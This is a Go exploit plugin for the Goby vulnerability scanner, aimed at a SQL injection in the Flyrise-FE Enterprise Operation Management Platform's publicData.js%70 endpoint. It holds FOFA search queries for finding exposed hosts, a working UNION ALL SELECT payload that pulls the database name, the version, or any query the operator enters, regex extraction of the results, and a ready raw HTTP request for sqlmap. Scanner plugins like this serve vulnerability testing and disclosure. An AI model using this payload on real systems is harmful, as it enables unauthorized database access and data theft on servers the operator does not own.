package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Flyrise-FE-Ent-Operation-MP /oaerp/ui/common/publicData.js%70 SQL Injection Vulnerability",
    "Description": "<p>The Flyrise-FE Enterprise Operation Management Platform has a SQL injection vulnerability in the publicData.js interface. Unauthorized attackers can exploit this vulnerability to obtain sensitive database information, potentially gaining server access, and putting the website at significant risk.</p>",
    "Product": "Flyrise-FE-Ent-Operation-MP",
    "Homepage": "https://www.flyrise.cn/",
    "DisclosureDate": "2024-02-01",
    "PostTime": "2024-11-01",
    "Author": "2987612621@qq.com",
    "FofaQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"src=\\\"/js39/flyrise.dialog.js\" || (body=\"src=\\\"/js39/external/jquery\" && body=\"/css39/\")",
    "GobyQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"src=\\\"/js39/flyrise.dialog.js\" || (body=\"src=\\\"/js39/external/jquery\" && body=\"/css39/\")",
    "Level": "2",
    "Impact": "<p>Unauthorized attackers can exploit the SQL injection vulnerability to access sensitive information in the database, which may lead to data breaches and further system attacks.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://www.flyrise.cn/\">https://www.flyrise.cn/</a></p><p>2.Deploy a web application firewall to monitor database operations. </p><p>3.If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-FE%E4%BC%81%E4%B8%9A%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0publicData.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,sql,sqlPoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "@@version,db_name(),user",
            "show": "attackType=default"
        },
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "飞企互联-FE企业运营管理平台 /oaerp/ui/common/publicData.js%70 SQL 注入漏洞",
            "Product": "飞企互联-FE企业运营管理平台",
            "Description": "<p>飞企互联-FE企业运营管理平台 publicData.js 接口存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本&nbsp;</p><p><a href=\"https://www.flyrise.cn/\">https://www.flyrise.cn/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>未经授权的攻击者可以通过SQL注入漏洞获取数据库中的敏感信息，可能导致数据泄露和系统被进一步攻击。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Flyrise-FE-Ent-Operation-MP /oaerp/ui/common/publicData.js%70 SQL Injection Vulnerability",
            "Product": "Flyrise-FE-Ent-Operation-MP",
            "Description": "<p>The Flyrise-FE Enterprise Operation Management Platform has a SQL injection vulnerability in the publicData.js interface. Unauthorized attackers can exploit this vulnerability to obtain sensitive database information, potentially gaining server access, and putting the website at significant risk.</p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://www.flyrise.cn/\">https://www.flyrise.cn/</a><br></p><p>2.Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3.If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Unauthorized attackers can exploit the SQL injection vulnerability to access sensitive information in the database, which may lead to data breaches and further system attacks.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

sendPayloadsikhakjl := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
  setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
    GetRequest := httpclient.NewGetRequestConfig(urlGet)
    GetRequest.Timeout = 12
    GetRequest.VerifyTls = false
    GetRequest.FollowRedirect = false
    for headName, headValue := range head {
      GetRequest.Header.Store(headName, headValue)
    }
    return httpclient.DoHttpRequest(hostInfo, GetRequest)
  }
  
    //按需求选择自己的发包方式
  
    //---------------------------------------------
    //以下是发包具体内容,这里以POST请求为例
    //---------------------------------------------
    //漏洞的url
    url := `/oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db='%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,`+ sql +`,NULL,NULL,NULL,NULL--%20NOJe--`
    //拼接sql语句
    header := map[string]string{
      "User-Agent":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    }
    resp, err := setGetRequest(hostInfo, url, header)
    if err != nil {
      return nil, err
    }
    //状态码可自定义,这里默认200
    if resp.StatusCode != 200 {
      return nil, errors.New("not response 200")
    }
    return resp, nil
  }
  
  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      sendPayload := sendPayloadsikhakjl
      // 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
      // PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
      // SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
      // SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
      // Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
  
      //检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配
  
      //如果是其他类型的注入,请按照具体情况进行检测
      sql := `db_name()`
      resp, err := sendPayload(hostInfo, sql)
      if err != nil {
        return false
      }
      if !strings.Contains(resp.Utf8Html, `"ST05":"`) {
        return false
      }
     if !strings.Contains(resp.Utf8Html, `,"ST06"`) {
        return false
      }
      // 拼接SQL注入数据包的请求路径即可
      ss.VulURL = hostInfo.FixedHostInfo + `/oaerp/ui/common/publicData.js%70`
      return true
    },
    func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      sendPayload := sendPayloadsikhakjl
      attackType := goutils.B2S(stepLogs.Params["attackType"])
      
      //Switch ExpParams
      //若自己修改ExpParams,请自行修改switch case
      switch attackType {
      case "default":
        sql := goutils.B2S(stepLogs.Params["default"])
        resp, err := sendPayload(expResult.HostInfo, sql)
        if err != nil && strings.Contains(err.Error(), "not response 200") {
          expResult.Output = `漏洞利用失败:` + err.Error()
          expResult.Success = false
          return expResult
        }
  
        // 正则匹配利用结果,需自己修改
        // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
        re := regexp.MustCompile(`"ST05":"([^"]+)"`)
        match := re.FindStringSubmatch(resp.Utf8Html)
        if len(match) < 1 {
          //正则失败
          expResult.Output = `Exploitation failed.`
          expResult.Success = false
          return expResult
        }
        expResult.Success = true
  
        expResult.Output = `The key points you need to extract is : ` + match[1]
    fmt.Print(expResult)
        return expResult
      case "sql":
        sql := goutils.B2S(stepLogs.Params["sql"])
        resp, err := sendPayload(expResult.HostInfo, sql)
        if err != nil && strings.Contains(err.Error(), "not response 200") {
          expResult.Output = `漏洞利用失败:` + err.Error()
          expResult.Success = false
          return expResult
        }
  
        // 正则匹配利用结果,需自己修改
        // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
        re := regexp.MustCompile(`"ST05":"([^"]+)"`)
        match := re.FindStringSubmatch(resp.Utf8Html)
        if len(match) < 1 {
          //正则失败
          expResult.Output = `Exploitation failed.`
          expResult.Success = false
          return expResult
        }
        expResult.Success = true
  
        expResult.Output = `The key points you need to extract is : ` + match[1]
    fmt.Print(expResult)
        return expResult
  
      case "sqlPoint":
        sql := "db_name()"
        _, err := sendPayload(expResult.HostInfo, sql)
        if err != nil {
          expResult.Output = `Exploitation failed: ` + err.Error()
          expResult.Success = false
          return expResult
        }
        //sqlPoint,给用户跑sqlmap用,需修改对应的参数
        expResult.Success = true
        expResult.Output = `GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db='%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,db_name(),NULL,NULL,NULL,NULL--%20NOJe-- HTTP/1.1
  Host: ` + expResult.HostInfo.HostInfo + `
  UPragma: no-cache
  Cache-Control: no-cache
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  `
        return expResult
      //检查ExpParams是否设置正确
      default:
        expResult.Output = `Unknown attack type: ` + attackType
        expResult.Success = false
        return expResult
      }
    },
  ))
  
  }